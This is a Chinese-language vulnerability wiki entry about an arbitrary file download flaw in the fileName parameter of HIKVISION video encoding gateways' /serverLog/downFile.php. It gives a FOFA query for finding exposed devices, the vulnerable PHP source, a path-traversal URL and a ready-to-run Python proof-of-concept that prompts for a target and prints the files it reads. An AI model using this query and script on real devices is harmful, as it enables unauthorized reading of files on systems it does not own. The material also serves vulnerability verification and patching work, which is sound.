# HIKVISION 视频编码设备接入网关 任意文件下载

## 漏洞描述

海康威视视频接入网关系统在页面/serverLog/downFile.php的参数fileName存在任意文件下载漏洞

## 漏洞影响

> [!NOTE]
>
> HIKVISION 视频编码设备接入网关

## FOFA

> [!NOTE]
>
> title="视频编码设备接入网关"

## 漏洞复现

![](http://wikioss.peiqi.tech/vuln/hiv-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞文件为 **downFile.php**, 其中 **参数 fileName** 没有过滤危险字符，导致可文件遍历下载

```php
<?php
$file_name=$_GET['fileName'];
$file_dir = "../../../log/";
if   (!file_exists($file_dir.$file_name))   {   //检查文件是否存在  
  echo'<script> alert("文件不存在!");window.history.back(-1);</script>'; 
  exit();

}else{	
	$file = fopen($file_dir . $file_name,"r"); // 打开文件
	// 输入文件标签
	Header("Content-type: application/octet-stream");
	Header("Accept-Ranges: bytes");
	Header("Accept-Length: ".filesize($file_dir . $file_name));
	Header("Content-Disposition: attachment; filename=" . $file_name);
	// 输出文件内容
	echo fread($file,filesize($file_dir.$file_name));
	fclose($file);
	exit();
}
?> 
```

访问 http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php 下载文件

![](http://wikioss.peiqi.tech/vuln/hiv-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## 漏洞利用POC

```python
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: HIKVISION 视频编码设备接入网关                               \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \033[0m".format(target_url))
        if "$file_name" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功读取 downFile.php \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](http://wikioss.peiqi.tech/vuln/hiv-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## Goby & POC

> [!NOTE]
>
> 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中
>
> HIKVISION_Video_coding_equipment_Download_any_file

![](http://wikioss.peiqi.tech/vuln/hiv-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)